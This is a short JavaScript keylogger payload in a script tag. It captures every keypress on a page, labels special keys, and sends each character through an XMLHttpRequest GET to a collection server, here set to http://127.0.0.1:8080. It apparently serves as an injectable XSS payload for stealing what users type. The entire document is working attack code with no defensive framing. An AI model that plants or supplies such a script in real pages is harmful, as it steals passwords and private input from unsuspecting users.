<script>
    document.onkeypress = function KeyPress(e){
    var key;
	var u;
	var http = new XMLHttpRequest();
	e = e.which || e.keyCode;
	if(e) {             
		key = e
	}
	u = key;
 	switch (key) {
		case 32:
			u = "[Space]";
			break;
		case 13:
			u = "[Enter]";
			break;
		case 9:
			u = "[Tab]";
			break;
		case 8:
			u = "[Backspace]";
	}
    if (u===parseInt(key, 10)){
		u = String.fromCharCode(key)
		ky = u;
	}
	else {
		ky = u;
	}
	http.open("GET","http://127.0.0.1:8080/"+"key="+decodeURI(ky),true);
	http.send(null);
}
</script>
